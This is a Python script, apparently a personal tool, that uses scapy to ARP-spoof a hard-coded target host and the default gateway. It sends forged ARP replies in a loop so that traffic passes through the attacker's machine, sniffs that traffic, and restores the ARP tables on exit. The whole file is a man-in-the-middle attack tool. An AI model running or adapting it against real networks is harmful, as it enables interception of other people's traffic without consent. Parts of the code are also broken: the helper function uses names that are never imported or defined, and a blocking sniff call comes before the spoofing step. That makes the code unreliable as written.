#!venv/bin/python3

import scapy.all as scapy
import time 

def find_unused_ip():
    # Create an ARP request packet
    arp = ARP(pdst=subnet)

    # Create an Ethernet frame
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")

    # Combine the ARP and Ethernet frames
    packet = ether / arp

    # Send the packet and capture responses
    result = srp(packet, timeout=3, verbose=0)[0]


def get_gw_ip():
    """
    Retrieve the IP address of the default gateway.
    @return The IP address of the default gateway.
    """
    return scapy.conf.route.route("0.0.0.0")[2]

# use scapy to send ARP requests to all IPs in the subnet
def spoof(spoof_ip, target_ip):
    packet = scapy.ARP(op = 2, psrc = spoof_ip, hwdst = scapy.getmacbyip(target_ip), pdst = target_ip) #implied my mac for hwsrc
    scapy.send(packet, verbose = False)

# use scapy restore arp tables in router and target
def restore(src_ip, target_ip):
    packet = scapy.ARP(op = 2, psrc = src_ip, hwsrc = scapy.getmacbyip(src_ip), hwdst = scapy.getmacbyip(target_ip), pdst = target_ip) #op is response
    scapy.send(packet, verbose = False)

# execute the callback function for each packet received
def custom_action(target):
    print(target)
    def packet_callback(packet):
        print(packet.summary())
    return packet_callback

if __name__ == '__main__':
    # network_scan('/16')
    gw_ip = get_gw_ip()
    target = '10.1.4.171'
    packets_sent = 0
    frequency = 5

    start_time = time.time()
    while(1):
        current_time = time.time()
        try:
            scapy.sniff(prn = custom_action(target), filter = f'host {target}')
            if(current_time - start_time > frequency): 
                start_time  = current_time
                spoof(gw_ip, target) #tell the target that the router is associated with my mac address
                spoof(target, gw_ip) #tell the router that the target is associated with my mac address
                packets_sent = packets_sent + 2
                print(f'{packets_sent} updates to ARP tables.')
        except KeyboardInterrupt:
            print('\nRestoring original ARP tables...')
            restore(gw_ip, target) 
            restore(target, gw_ip)
            print('Restored. Exiting.')
            exit(0)

